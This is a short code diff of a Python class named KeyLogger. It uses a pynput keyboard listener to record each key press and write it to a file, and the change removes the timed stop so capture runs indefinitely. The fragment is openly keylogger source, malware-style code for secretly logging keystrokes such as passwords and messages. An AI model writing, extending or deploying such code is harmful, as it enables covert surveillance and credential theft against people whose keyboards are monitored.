@@ -55,15 +55,14 @@ class KeyLogger():
                 self.current_key.append(" " + str(key) + " ")
                 file.write(""+str(key)+"")
 
-        
-    
-            
 
-           
     def run(self):
         with Listener(on_press=self.on_press) as keyboard_listener:
             keyboard_listener.join()
-            sleep(10)
-            keyboard_listener.stop()
+
+            
+            
+            
+
 keylogger = KeyLogger()
 keylogger.run()
